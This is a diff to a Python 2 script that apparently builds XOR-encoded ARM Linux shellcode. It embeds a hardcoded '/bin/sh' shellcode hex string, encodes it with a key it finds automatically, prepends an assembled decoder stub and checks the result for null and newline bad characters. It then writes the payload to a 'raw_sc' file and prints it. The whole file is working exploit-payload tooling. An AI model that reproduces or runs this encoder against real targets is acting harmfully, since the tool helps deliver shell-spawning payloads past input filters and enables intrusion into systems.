@@ -1,14 +1,22 @@
 #!python
 import os
+import sys
 import tempfile
 
 # Assembler 
 BIN_AS = '/usr/bin/arm-linux-gnueabi-as'
+ALTER_BIN_AS = 'as'
 # Linker
 BIN_LD = '/usr/bin/arm-linux-gnueabi-ld'
+ALTER_BIN_LD = 'ld'
 # Objcopy
 BIN_OC = '/usr/bin/arm-linux-gnueabi-objcopy'
+ALTER_BIN_OC = 'objcopy'
+# RAW Shellcode
+RAW_SC = 'raw_sc'
 
+def SYSERR(m):
+    print >> sys.stderr, "%s" % (m)
 
 def cleanup(fn):
     for f in fn:
@@ -18,8 +26,26 @@ def cleanup(fn):
             except:
                 pass
 
+def prepareCompiler():
+    global BIN_AS
+    global BIN_LD
+    global BIN_OC
+
+    if os.path.exists(BIN_AS) == False:
+        BIN_AS = ALTER_BIN_AS
+
+    if os.path.exists(BIN_LD) == False:
+        BIN_LD = ALTER_BIN_LD
+
+    if os.path.exists(BIN_OC) == False:
+        BIN_OC = ALTER_BIN_OC
+
+    SYSERR( "[D:] set 'as': %s" % (BIN_AS) )
+    SYSERR( "[D:] set 'ld': %s" % (BIN_LD) )
+    SYSERR( "[D:] set 'objcopy': %s" % (BIN_OC) )
+
 def MakeXOR(size, xor=0x58):
-MAX_SC_SIZE = 256
+    MAX_SC_SIZE = 256
     LOOP_SC_SIZE = MAX_SC_SIZE - size
 
     XOR="""
@@ -135,16 +161,37 @@ def encodeShellcode(sc, key):
     
     return xsc
 
+def checkBadChar(sc, bc=[0x00, 0x0a]):
+    from collections import defaultdict
+    bcs = defaultdict(int)
+    size = len(sc)
+    for s in sc:
+        if s in bc:
+            bcs[s] += 1
+
+    return bcs
+
 if __name__ == '__main__':
     # /bin/sh
     SC = "01608fe216ff2fe102a000220b2705b4694601df2f62696e2f7368000000c046".decode('hex')
 
+    prepareCompiler()
+
     # find xor key to xor the shellcode
     key = findXorKey(SC)
-    print "Found a xor key:", key
+    SYSERR( "Found a xor key: %s" % key )
     # encode with xor key
     XORSC = encodeShellcode(SC, key)
     # build a decoder
     XORER = MakeXOR(len(XORSC), key)
-    #print (XORER + XORSC)
-    print repr(XORER)
+    rv = checkBadChar(XORER+XORSC)
+    if len(rv) != 0:
+        SYSERR("!!! Bad char has been found in shellcode. Please check out")  
+    else:
+        SYSERR( "Shellcode: size - %d" % (len(XORSC)) )
+        SYSERR( "Decoder  : size - %d" % (len(XORER)) )
+        if os.path.exists(RAW_SC) == True:
+            os.unlink(RAW_SC)
+        open(RAW_SC, 'wb').write(XORER + XORSC)
+
+    print XORSC.encode('hex')
